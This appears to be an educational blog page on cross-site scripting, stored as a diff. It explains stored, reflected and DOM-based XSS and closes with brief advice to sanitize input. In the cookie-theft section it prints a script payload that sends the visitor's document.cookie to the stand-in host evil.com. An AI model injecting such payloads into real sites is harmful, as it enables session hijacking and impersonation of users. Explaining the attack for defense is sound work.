@@ -1,0 +1,65 @@
+I"2<p>Overview
+Cross-site Scripting (XSS) is a client-side code injection attack. The attacker aims to execute malicious scripts in a web browser of the victim by including malicious code in a legitimate web page or web application. The actual attack occurs when the victim visits the web page or web application that executes the malicious code. The web page or web application becomes a vehicle to deliver the malicious script to the user’s browser. Vulnerable vehicles that are commonly used for Cross-site Scripting attacks are forums, message boards, and web pages that allow comments.
+A web page or web application is vulnerable to XSS if it uses unsanitized user input in the output that it generates. This user input must then be parsed by the victim’s browser.</p>
+
+<p>“Isn’t Cross-site Scripting the User’s Problem?”
+If an attacker can abuse an XSS vulnerability on a web page to execute arbitrary JavaScript in a user’s browser, the security of that vulnerable website or vulnerable web application and its users has been compromised. XSS is not the user’s problem like any other security vulnerability. If it is affecting your users, it affects you.</p>
+
+<p>Cross-site Scripting may also be used to deface a website instead of targeting the user. The attacker can use injected scripts to change the content of the website or even redirect the browser to another web page, for example, one that contains malicious code.</p>
+
+<p>Description
+Cross-Site Scripting (XSS) attacks occur when:</p>
+
+<p>1.Data enters a Web application through an untrusted source, most frequently a web request.
+2.The data is included in dynamic content that is sent to a web user without being validated for malicious content.
+The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash, or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data, like cookies or other session information, to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user’s machine under the guise of the vulnerable site.</p>
+
+<p>Stored and Reflected XSS Attacks
+While the goal of an XSS attack is always to execute malicious JavaScript in the victim’s browser, there are few fundamentally different ways of achieving that goal. XSS attacks are often divided into three types:
+1.Persistent XSS, where the malicious string originates from the website’s database.</p>
+
+<p>2.Reflected XSS, where the malicious string originates from the victim’s request.</p>
+
+<p>3.DOM-based XSS, where the vulnerability is in the client-side code rather than the server-side code.</p>
+
+<p>Stored XSS Attacks
+Consider a web application that allows users to enter a username that is displayed on each user’s profile page. The application stores each username in a local database. A malicious user notices that the web application fails to sanitize the username field and inputs malicious JavaScript code as part of their username. When other users view the attacker’s profile page, the malicious code automatically executes in the context of their session</p>
+
+<p>Refer to the example in Stealing Cookies Using XSS</p>
+
+<p>Reflected XSS Attacks
+In a reflected XSS attack, the malicious string is part of the victim’s request to the website. The website then includes this malicious string in the response sent back to the user. The diagram below illustrates this scenario:</p>
+
+<p>1.The attacker crafts a URL containing a malicious string and sends it to the victim.</p>
+
+<p>2.The victim is tricked by the attacker into requesting the URL from the website.</p>
+
+<p>3.The website includes the malicious string from the URL in the response.</p>
+
+<p>4.The victim’s browser executes the malicious script inside the response, sending the victim’s cookies to the attacker’s server.</p>
+
+<p>Stealing Cookies Using XSS
+Criminals often use XSS to steal cookies. This allows them to impersonate the victim. The attacker can send the cookie to their own server in many ways. One of them is to execute the following client-side script in the victim’s browser:</p>
+
+<p>&lt;script&gt;
+window.location=”http://evil.com/?cookie=” + document.cookie
+&lt;/script&gt;</p>
+
+<p>The figure below illustrates a step-by-step walkthrough of a simple XSS attack.
+This example illustrated is a persistent XSS attack</p>
+
+<p>1.The attacker injects a payload into the website’s database by submitting a vulnerable form with malicious JavaScript content.</p>
+
+<p>2.The victim requests the web page from the web server.</p>
+
+<p>3.The web server serves the victim’s browser the page with attacker’s payload as part of the HTML body.</p>
+
+<p>4.The victim’s browser executes the malicious script contained in the HTML body. In this case, it sends the victim’s cookie to the attacker’s server.</p>
+
+<p>5.The attacker now simply needs to extract the victim’s cookie when the HTTP request arrives at the server.</p>
+
+<p>6.The attacker can now use the victim’s stolen cookie for impersonation.</p>
+
+<p>How to Prevent XSS
+To keep yourself safe from XSS, you must sanitize your input. Your application code should never output data received as input directly to the browser without checking it for malicious code</p>
+:ET
